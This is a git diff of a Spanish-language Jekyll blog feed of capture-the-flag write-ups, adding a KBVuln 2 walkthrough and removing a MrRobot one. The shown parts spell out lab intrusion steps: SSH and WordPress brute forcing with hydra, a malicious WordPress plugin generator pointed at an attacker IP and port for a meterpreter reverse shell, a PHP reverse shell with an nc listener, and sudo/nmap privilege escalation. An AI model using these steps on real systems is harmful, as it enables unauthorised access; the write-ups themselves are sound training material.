@@ -1,11 +1,11 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.2.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2022-08-01T12:53:52+02:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">TheZombrex</title><subtitle>TheZombrex blog</subtitle><author><name>TheZombrex</name></author><entry><title type="html">KBVuln 1</title><link href="http://localhost:4000/vulnhub/kbvuln1/" rel="alternate" type="text/html" title="KBVuln 1" /><published>2022-08-01T00:00:00+02:00</published><updated>2022-08-01T00:00:00+02:00</updated><id>http://localhost:4000/vulnhub/kbvuln1</id><content type="html" xml:base="http://localhost:4000/vulnhub/kbvuln1/"><![CDATA[<p>https://www.vulnhub.com/entry/kb-vuln-1,540/</p>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.2.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2022-08-01T13:35:40+02:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">TheZombrex</title><subtitle>TheZombrex blog</subtitle><author><name>TheZombrex</name></author><entry><title type="html">KBVuln 1</title><link href="http://localhost:4000/vulnhub/kbvuln1/" rel="alternate" type="text/html" title="KBVuln 1" /><published>2022-08-01T00:00:00+02:00</published><updated>2022-08-01T00:00:00+02:00</updated><id>http://localhost:4000/vulnhub/kbvuln1</id><content type="html" xml:base="http://localhost:4000/vulnhub/kbvuln1/"><![CDATA[<p>https://www.vulnhub.com/entry/kb-vuln-1,540/</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>nmap <span class="nt">-vvv</span> <span class="nt">-sS</span> <span class="nt">-sV</span> <span class="nt">-O</span> 192.168.122.0/24
 </code></pre></div></div>
 
 <p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln1/1.png" alt="image-center" class="align-center" /></p>
 
-<p>Saldrá una máquina con varios puestos abiertos</p>
+<p>Saldrá una máquina con varios puertos abiertos</p>
 
 <p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln1/2.png" alt="image-center" class="align-center" /></p>
 
@@ -93,7 +93,214 @@ find . -exec /bin/bash -p \; -quit</p>
 
 <p>Usuario: 48a365b4ce1e322a55ae9017f3daf0c0</p>
 
-<p>Root: 1eedddf9fff436e6648b5e51cb0d2ec7</p>]]></content><author><name>TheZombrex</name></author><category term="vulnhub" /><category term="vulnhub" /><category term="easy" /><category term="writeup" /><summary type="html"><![CDATA[[Easy][Vulnhub] Writeup de KBVuln 1.]]></summary></entry><entry><title type="html">Dobby hogwarts</title><link href="http://localhost:4000/vulnhub/dobby-hogwarts/" rel="alternate" type="text/html" title="Dobby hogwarts" /><published>2022-07-31T00:00:00+02:00</published><updated>2022-07-31T00:00:00+02:00</updated><id>http://localhost:4000/vulnhub/dobby-hogwarts</id><content type="html" xml:base="http://localhost:4000/vulnhub/dobby-hogwarts/"><![CDATA[<p>https://www.vulnhub.com/entry/hogwarts-dobby,597/</p>
+<p>Root: 1eedddf9fff436e6648b5e51cb0d2ec7</p>]]></content><author><name>TheZombrex</name></author><category term="vulnhub" /><category term="vulnhub" /><category term="easy" /><category term="writeup" /><summary type="html"><![CDATA[[Easy][Vulnhub] Writeup de KBVuln 1.]]></summary></entry><entry><title type="html">KBVuln 2</title><link href="http://localhost:4000/vulnhub/kbvuln2/" rel="alternate" type="text/html" title="KBVuln 2" /><published>2022-08-01T00:00:00+02:00</published><updated>2022-08-01T00:00:00+02:00</updated><id>http://localhost:4000/vulnhub/kbvuln2</id><content type="html" xml:base="http://localhost:4000/vulnhub/kbvuln2/"><![CDATA[<p>https://www.youtube.com/watch?v=WhLngRlmMrA
+https://github.com/wetw0rk/malicious-wordpress-plugin</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>nmap <span class="nt">-vvv</span> <span class="nt">-sS</span> <span class="nt">-sV</span> <span class="nt">-O</span> 192.168.122.0/24
+</code></pre></div></div>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln2/1.png" alt="image-center" class="align-center" /></p>
+
+<p>Saldrá una máquina con varios puertos abiertos</p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln2/2.png" alt="image-center" class="align-center" /></p>
+
+<p>Entrar al servidor web con la dirección 192.168.122.6, saldrá la web por defecto de Apache</p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln2/3.png" alt="image-center" class="align-center" /></p>
+
+<p>Usar gobuster para ver directorios ocultos, mostrará como resultado varios directorios, entre ellos uno llamado wordpress</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>gobuster <span class="nb">dir</span> <span class="nt">-u</span> 192.168.122.6 <span class="nt">-w</span> /usr/share/dirb/wordlists/common.txt
+</code></pre></div></div>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln2/4.png" alt="image-center" class="align-center" /></p>
+
+<p>Enumerar los usuarios de la web de wordpress, solo encontrará el usuario admin</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>wpscan <span class="nt">--url</span> 192.168.122.6/wordpress <span class="nt">-e</span> u
+</code></pre></div></div>
+
+<p>Usuario: Anonymous
+Contraseña: Vacía</p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln2/5.png" alt="image-center" class="align-center" />
+<img src="http://localhost:4000/assets/images/vulnhub/kbvuln2/6.png" alt="image-center" class="align-center" /></p>
+
+<p>Lanzar un ataque de fuerza bruta para encontrar la contraseña del usuario admin, no dará resultado</p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln2/7.png" alt="image-center" class="align-center" /></p>
+
+<p>Buscar usuarios en el sistema, solo encontrará kbadmin</p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln2/8.png" alt="image-center" class="align-center" /></p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln2/9.png" alt="image-center" class="align-center" /></p>
+
+<p>Intentar un ataque de fuerza bruta para conseguir la contraseña, no dará resultado</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>hydra <span class="nt">-l</span> kbadmin <span class="nt">-P</span> /usr/share/wordlists/rockyou.txt 192.168.122.6 ssh
+</code></pre></div></div>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln2/10.png" alt="image-center" class="align-center" /></p>
+
+<p>Ver directorios compartidos por smb</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbmap <span class="nt">-H</span>  192.168.122.6
+</code></pre></div></div>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln2/11.png" alt="image-center" class="align-center" /></p>
+
+<p>Entrar al directorio de Anonymous y mostrar el contenido</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbclient <span class="nt">-N</span> //192.168.122.6/Anonymous
+</code></pre></div></div>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln2/12.png" alt="image-center" class="align-center" /></p>
+
+<p>Descargar el archivo backup.zip</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>get backup.zip
+</code></pre></div></div>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln2/13.png" alt="image-center" class="align-center" /></p>
+
+<p>Moverlo a un nuevo directorio y descomprimirlo</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">mkdir </span>kbvuln2
+<span class="nb">mv </span>backup.zip kbvuln2/
+<span class="nb">ls
+</span>unzip backup.zip
+</code></pre></div></div>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln2/14.png" alt="image-center" class="align-center" /></p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln2/15.png" alt="image-center" class="align-center" /></p>
+
+<p>Creará un directorio llamado wordpress y un archivo llamado <code class="language-plaintext highlighter-rouge">remember_me.txt</code></p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln2/16.png" alt="image-center" class="align-center" /></p>
+
+<p>Leer el archivo remember_me.txt, mostrará un usuario y contraseña</p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln2/17.png" alt="image-center" class="align-center" /></p>
+
+<p>Ir al login de la web de wordpress</p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln2/18.png" alt="image-center" class="align-center" /></p>
+
+<p>Copiar la direccion DNS del action del formulario.</p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln2/19.png" alt="image-center" class="align-center" /></p>
+
+<p>Añadir el dominio dns al archivo <code class="language-plaintext highlighter-rouge">/etc/hosts</code></p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln2/20.png" alt="image-center" class="align-center" /></p>
+
+<p>Recargar el sitio, ahora se verá correctamente</p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln2/21.png" alt="image-center" class="align-center" /></p>
+
+<p>Colocar el usuario y contraseña y dar en Log In</p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln2/22.png" alt="image-center" class="align-center" /></p>
+
+<p>Ir al editor de temas de wordpress</p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln2/23.png" alt="image-center" class="align-center" /></p>
+
+<p>Editar el archivo 404 con un script de reverse_php</p>
+
+<p>Preparar un plugin que hará un shell inverso</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cd</span> ~/Downloads/repos
+
+git clone https://github.com/wetw0rk/malicious-wordpress-plugin.git
+
+<span class="nb">cd </span>malicious-wordpress-plugin
+
+Python wordpwn.py 192.168.122.5 4444 Y
+</code></pre></div></div>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln2/24.png" alt="image-center" class="align-center" /></p>
+
+<p>Se pondrá de forma automática en escucha</p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln2/25.png" alt="image-center" class="align-center" /></p>
+
+<p>Y se creará un archivo zip</p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln2/26.png" alt="image-center" class="align-center" /></p>
+
+<p>Subir el plugin al sitio de wordpress</p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln2/27.png" alt="image-center" class="align-center" />
+<img src="http://localhost:4000/assets/images/vulnhub/kbvuln2/28.png" alt="image-center" class="align-center" /></p>
+
+<p>Activar el plugin</p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln2/29.png" alt="image-center" class="align-center" /></p>
+
+<p>Ir al editor de plugins y seleccionar GotEm</p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln2/30.png" alt="image-center" class="align-center" /></p>
+
+<p>Ir a la ruta del plugin
+<code class="language-plaintext highlighter-rouge">http://192.168.122.6/wordpress/wp-content/plugins/malicious/wetw0rk_maybe.php</code></p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln2/31.png" alt="image-center" class="align-center" /></p>
+
+<p>Se abrirá un shell inverso con meterpreter</p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln2/32.png" alt="image-center" class="align-center" /></p>
+
+<p>Cambiar a shell y ver el usuario</p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln2/33.png" alt="image-center" class="align-center" /></p>
+
+<p>Ir al directorio home del usuario kbadmin y mostrar el contenido, luego leer el archivo <code class="language-plaintext highlighter-rouge">user.txt</code></p>
+
+<p>Dará la flag del usuario</p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln2/34.png" alt="image-center" class="align-center" /></p>
+
+<p>Ir a /var/www/html y mostrar el contenido</p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln2/35.png" alt="image-center" class="align-center" /></p>
+
+<p>Leer el contenido de read_ME.txt</p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln2/36.png" alt="image-center" class="align-center" /></p>
+
+<p>Leer el contenido del archivo remember_me.txt</p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln2/37.png" alt="image-center" class="align-center" /></p>
+
+<p>Tratar de acceder por ssh al usuario kbadmin con esa contraseña</p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln2/38.png" alt="image-center" class="align-center" /></p>
+
+<p>Ver los permisos del usuario kbadmin usando el comando <code class="language-plaintext highlighter-rouge">sudo –l</code>, mostrará que tiene todos los permisos por lo que puede cambiar al usuario root sin necesidad de introducir contraseña.</p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln2/39.png" alt="image-center" class="align-center" /></p>
+
+<p>Cambiar al usuario root</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>su
+</code></pre></div></div>
+<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln2/40.png" alt="image-center" class="align-center" /></p>
+
+<p>Ir al directorio de root y mostrar el contenido</p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln2/41.png" alt="image-center" class="align-center" /></p>
+
+<p>Mostrar el contenido de flag.txt</p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln2/42.png" alt="image-center" class="align-center" /></p>
+
+<h2 id="flags">Flags</h2>
+
+<p>Usuario: 03bf4d20dac5644c75e69e40bad48db0</p>
+
+<p>Root: dc387b4cf1a4143f562dd1bdb3790ff1</p>]]></content><author><name>TheZombrex</name></author><category term="vulnhub" /><category term="vulnhub" /><category term="easy" /><category term="writeup" /><summary type="html"><![CDATA[[Easy][Vulnhub] Writeup de KBVuln 2.]]></summary></entry><entry><title type="html">Dobby hogwarts</title><link href="http://localhost:4000/vulnhub/dobby-hogwarts/" rel="alternate" type="text/html" title="Dobby hogwarts" /><published>2022-07-31T00:00:00+02:00</published><updated>2022-07-31T00:00:00+02:00</updated><id>http://localhost:4000/vulnhub/dobby-hogwarts</id><content type="html" xml:base="http://localhost:4000/vulnhub/dobby-hogwarts/"><![CDATA[<p>https://www.vulnhub.com/entry/hogwarts-dobby,597/</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>nmap <span class="nt">-vvv</span> <span class="nt">-sS</span> <span class="nt">-sV</span> <span class="nt">-O</span> 192.168.1.0/24
 </code></pre></div></div>
@@ -964,180 +1171,4 @@ https://gtfobins.github.io/gtfobins/pip/</p>
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat </span>flag.txt  
 </code></pre></div></div>
 
-<p><img src="http://localhost:4000/assets/images/htb/meow/5.png" alt="image-center" class="align-center" /></p>]]></content><author><name>TheZombrex</name></author><category term="hackthebox" /><category term="hackthebox" /><category term="StartingPoint" /><category term="writeup" /><summary type="html"><![CDATA[[StartingPoint][HackTheBox] Writeup de Meow.]]></summary></entry><entry><title type="html">MrRobot</title><link href="http://localhost:4000/vulnhub/mrrobot/" rel="alternate" type="text/html" title="MrRobot" /><published>2022-07-30T00:00:00+02:00</published><updated>2022-07-30T00:00:00+02:00</updated><id>http://localhost:4000/vulnhub/mrrobot</id><content type="html" xml:base="http://localhost:4000/vulnhub/mrrobot/"><![CDATA[<p>https://www.vulnhub.com/entry/mr-robot-1,151/</p>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>nmap <span class="nt">-vvv</span> <span class="nt">-sS</span> <span class="nt">-sV</span> <span class="nt">-O</span> 192.168.1.0/24
-</code></pre></div></div>
-
-<p><img src="http://localhost:4000/assets/images/vulnhub/mrrobot/1.png" alt="image-center" class="align-center" /></p>
-
-<p>Saldrá una IP con el puerto 80 abierto</p>
-
-<p><img src="http://localhost:4000/assets/images/vulnhub/mrrobot/2.png" alt="image-center" class="align-center" /></p>
-
-<p>Abrir navegador e ir a la IP, en este caso</p>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>192.168.1.132
-</code></pre></div></div>
-<p><img src="http://localhost:4000/assets/images/vulnhub/mrrobot/3.png" alt="image-center" class="align-center" /></p>
-
-<p>Realizar un gobuster para ver los directorios ocultos en la web</p>
-
-<p><img src="http://localhost:4000/assets/images/vulnhub/mrrobot/4.png" alt="image-center" class="align-center" /></p>
-
-<p>Saldrán varios directorios, entre ellos uno llamado /robots</p>
-
-<p>Ir a <code class="language-plaintext highlighter-rouge">192.168.122.132/robots</code></p>
-
-<p>Saldrán varias cosas</p>
-
-<p><img src="http://localhost:4000/assets/images/vulnhub/mrrobot/5.png" alt="image-center" class="align-center" /></p>
-
-<p>Entrar a <code class="language-plaintext highlighter-rouge">/fsociety.dic</code> y se descargará un diccionario</p>
-
-<p>Entrar a <code class="language-plaintext highlighter-rouge">/key-1-of-3.txt</code></p>
-
-<p><img src="http://localhost:4000/assets/images/vulnhub/mrrobot/6.png" alt="image-center" class="align-center" /></p>
-
-<p>Ir a <code class="language-plaintext highlighter-rouge">192.168.122.132/wp-login.php</code></p>
-
-<h2 id="usar-hydra">Usar hydra</h2>
-
-<h3 id="encontrar-un-usuario-con-hydra">Encontrar un usuario con hydra</h3>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>hydra –t 64 –L fsociety.dic <span class="nt">-p</span> 1234 192.168.122.132 http-form-post <span class="s2">"/wp-login:log=^USER^&amp;pwd=^PASS^:invalid"</span>
-</code></pre></div></div>
-
-<h3 id="encontrar-contraseña">Encontrar contraseña</h3>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>hydra –t 64 –l usuario_a_usar <span class="nt">-P</span> fsociety.dic 192.168.122.132 http-form-post <span class="s2">"/wp-login:log=^USER^&amp;pwd=^PASS^:invalid"</span>
-</code></pre></div></div>
-<h3 id="encontrar-usuario-y-contraseña-juntos">Encontrar usuario y contraseña juntos</h3>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>hydra –t 64 –L fsociety.dic <span class="nt">-P</span> fsociety.dic 192.168.122.132 http-form-post <span class="s2">"/wp-login:log=^USER^&amp;pwd=^PASS^:invalid"</span>
-</code></pre></div></div>
-<p><img src="http://localhost:4000/assets/images/vulnhub/mrrobot/7.png" alt="image-center" class="align-center" /></p>
-
-<p>Encontrará el usuario Elliot, en sus diferentes variantes con mayúsculas y minúsculas.</p>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>wpscan –url 192.168.122.132 <span class="nt">-P</span> fsociety.dic <span class="nt">--usernames</span> Elliot
-</code></pre></div></div>
-<p><img src="http://localhost:4000/assets/images/vulnhub/mrrobot/8.png" alt="image-center" class="align-center" /></p>
-
-<p>Encontrará una contraseña al final del proceso</p>
-
-<p><img src="http://localhost:4000/assets/images/vulnhub/mrrobot/9.png" alt="image-center" class="align-center" /></p>
-
-<p>Entrar en el login con el usuario Elliot y la contraseña ER28-0652</p>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>192.168.122.132/wp-login.php
-</code></pre></div></div>
-<p><img src="http://localhost:4000/assets/images/vulnhub/mrrobot/10.png" alt="image-center" class="align-center" /></p>
-
-<p>Ir al editor de temas</p>
-
-<p><img src="http://localhost:4000/assets/images/vulnhub/mrrobot/11.png" alt="image-center" class="align-center" /></p>
-
-<p>Copiar <code class="language-plaintext highlighter-rouge">php-reverse-shell.php</code> de <code class="language-plaintext highlighter-rouge">/usr/share/webshells/php</code> a <code class="language-plaintext highlighter-rouge">~/Documentos</code></p>
-
-<p><img src="http://localhost:4000/assets/images/vulnhub/mrrobot/12.png" alt="image-center" class="align-center" /></p>
-
-<p>Cambiar el propietario del archivo con chown para poder editarlo</p>
-
-<p><img src="http://localhost:4000/assets/images/vulnhub/mrrobot/13.png" alt="image-center" class="align-center" /></p>
-
-<p>Editarlo con nano para que lo IP sea la de nuestro equipo y el puerto que queramos poner como escucha</p>
-
-<p><img src="http://localhost:4000/assets/images/vulnhub/mrrobot/14.png" alt="image-center" class="align-center" /></p>
-
-<p>Usar el comando <code class="language-plaintext highlighter-rouge">nc</code> para escuchar desde ese puerto</p>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-nlvp</span> 4444
-</code></pre></div></div>
-<p><img src="http://localhost:4000/assets/images/vulnhub/mrrobot/15.png" alt="image-center" class="align-center" /></p>
-
-<p>Ingresar un enlace inválido en wordpress</p>
-
-<p><img src="http://localhost:4000/assets/images/vulnhub/mrrobot/16.png" alt="image-center" class="align-center" /></p>
-
-<p>Se nos abrira una shell</p>
-
-<p>Entrar al directorio de wordpress</p>
-
-<p><img src="http://localhost:4000/assets/images/vulnhub/mrrobot/17.png" alt="image-center" class="align-center" /></p>
-
-<p>Leer el archivo <code class="language-plaintext highlighter-rouge">wp-config.php</code></p>
-
-<p><img src="http://localhost:4000/assets/images/vulnhub/mrrobot/18.png" alt="image-center" class="align-center" /></p>
-
-<p>Mirar los usuarios del equipo entrando al directorio <code class="language-plaintext highlighter-rouge">/home</code> y usando el comando</p>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">ls</span> –l
-</code></pre></div></div>
-<p><img src="http://localhost:4000/assets/images/vulnhub/mrrobot/19.png" alt="image-center" class="align-center" /></p>
-
-<p>Entrar al directorio de robot y ver el contenido</p>
-
-<p><img src="http://localhost:4000/assets/images/vulnhub/mrrobot/20.png" alt="image-center" class="align-center" /></p>
-
-<p>Leer el archivo <code class="language-plaintext highlighter-rouge">password.raw-md5</code></p>
-
-<p><img src="http://localhost:4000/assets/images/vulnhub/mrrobot/21.png" alt="image-center" class="align-center" /></p>
-
-<p>Descifrar el hash desde la web de dcode.fr/md5-hash</p>
-
-<p><img src="http://localhost:4000/assets/images/vulnhub/mrrobot/22.png" alt="image-center" class="align-center" /></p>
-
-<p>Usamos el siguiente comando en python</p>
-
-<p><img src="http://localhost:4000/assets/images/vulnhub/mrrobot/23.png" alt="image-center" class="align-center" /></p>
-
-<p>Cambiar de usuario a robot</p>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>su robot
-</code></pre></div></div>
-
-<p><img src="http://localhost:4000/assets/images/vulnhub/mrrobot/24.png" alt="image-center" class="align-center" /></p>
-
-<p>Ir al home y ver el contenido</p>
-
-<p><img src="http://localhost:4000/assets/images/vulnhub/mrrobot/25.png" alt="image-center" class="align-center" /></p>
-
-<p>Leer el archivo <code class="language-plaintext highlighter-rouge">key-2-of-3.txt</code></p>
-
-<p><img src="http://localhost:4000/assets/images/vulnhub/mrrobot/26.png" alt="image-center" class="align-center" /></p>
-
-<p>Entrar a nmap en modo interactivo</p>
-
-<p><img src="http://localhost:4000/assets/images/vulnhub/mrrobot/27.png" alt="image-center" class="align-center" /></p>
-
-<p>Cambiar a shell</p>
-
-<p><img src="http://localhost:4000/assets/images/vulnhub/mrrobot/28.png" alt="image-center" class="align-center" /></p>
-
-<p>Aparecerá con el usuario root</p>
-
-<p><img src="http://localhost:4000/assets/images/vulnhub/mrrobot/29.png" alt="image-center" class="align-center" /></p>
-
-<p>Ir al directorio <code class="language-plaintext highlighter-rouge">/root</code></p>
-
-<p><img src="http://localhost:4000/assets/images/vulnhub/mrrobot/30.png" alt="image-center" class="align-center" /></p>
-
-<p>Leer los archivos</p>
-
-<p><img src="http://localhost:4000/assets/images/vulnhub/mrrobot/31.png" alt="image-center" class="align-center" /></p>
-
-<h2 id="keys">Keys</h2>
-
-<h3 id="key1">Key1</h3>
-<p><img src="http://localhost:4000/assets/images/vulnhub/dobby_hogwarts/1.png" alt="image-center" class="align-center" /></p>
-
-<p><img src="http://localhost:4000/assets/images/vulnhub/mrrobot/32.png" alt="image-center" class="align-center" /></p>
-
-<h3 id="key2">Key2</h3>
-
-<p><img src="http://localhost:4000/assets/images/vulnhub/mrrobot/33.png" alt="image-center" class="align-center" /></p>
-
-<h3 id="key3">Key3</h3>
-
-<p><img src="http://localhost:4000/assets/images/vulnhub/mrrobot/34.png" alt="image-center" class="align-center" /></p>]]></content><author><name>TheZombrex</name></author><category term="vulnhub" /><category term="vulnhub" /><category term="easy" /><category term="writeup" /><summary type="html"><![CDATA[[Easy][Vulnhub] Writeup de MrRobot.]]></summary></entry></feed>
+<p><img src="http://localhost:4000/assets/images/htb/meow/5.png" alt="image-center" class="align-center" /></p>]]></content><author><name>TheZombrex</name></author><category term="hackthebox" /><category term="hackthebox" /><category term="StartingPoint" /><category term="writeup" /><summary type="html"><![CDATA[[StartingPoint][HackTheBox] Writeup de Meow.]]></summary></entry></feed>
